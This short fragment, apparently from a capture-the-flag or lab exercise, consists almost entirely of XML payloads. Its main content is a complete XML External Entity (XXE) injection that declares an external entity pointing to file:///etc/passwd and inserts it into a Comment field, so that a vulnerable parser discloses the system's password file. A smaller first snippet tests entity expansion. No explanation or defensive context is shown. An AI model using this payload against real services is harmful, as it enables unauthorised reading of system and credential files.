```
<Name>Mitchell Moser</Name>
<Author>Gimme the Loot</Author>
<Comment>&a;</Comment>
```

**`<?xml version="1.0"?>`**
**`<!DOCTYPE foo [`**
**`<!ELEMENT foo ANY >`**
**`<!ENTITY xxe SYSTEM "file:///etc/passwd" >`**
`]>`

`<Comment>`
`<Name>Gerh</Name>`
`<Author>BinaryChaos</Author>`
`<Comment>``&xxe;``</Comment>`
`</Comment>`